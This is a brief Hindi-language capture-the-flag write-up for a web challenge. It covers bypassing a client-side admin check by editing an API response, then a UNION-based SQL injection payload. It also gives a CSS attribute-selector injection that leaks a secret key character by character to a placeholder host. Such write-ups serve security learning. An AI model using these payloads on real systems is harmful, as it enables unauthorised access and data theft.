राइटअप

रजिस्ट्रेशन करके पोर्टल में प्रवेश करते हैं
JS या अनुरोध देखते हैं
एक अनुरोध — api/user-info, जो उपयोगकर्ता के अधिकारों के लिए ज़िम्मेदार है। लेकिन सुरक्षा केवल क्लाइंट साइड पर लागू है। इसलिए विभिन्न तरीकों से बायपास किया जा सकता है। सबसे सरल — रिस्पॉन्स में is_admin का मान 0 से 1 बदलना।

दो नए बटन दिखते हैं
Get Promotion में सीक्रेट डालने और फ़्लैग प्राप्त करने का अंतिम फ़ॉर्म है, और पेज कोड में भविष्य के CSS payload बनाने के लिए छोटा संकेत है।
दूसरे बटन Open Admin Panel में सेटिंग्स सर्च है जो SQLi के लिए कमज़ोर है।
SQLi से एट्रिब्यूट वैल्यू निकालते हैं जो CSS injection बनाने के लिए भी चाहिए:  ' UNION SELECT setting_value FROM admin_settings WHERE setting_name='secret_field_name' -- -
अंत में ऐसा पेलोड मिलता है:  .admin-secret-key[data-hr_secret_key_f5g4^="A"] { background-image: url("http://YOUR_URL?char=A" ); }
फिर कुंजी का उपयोग फ़्लैग प्राप्त करने के लिए करते हैं।
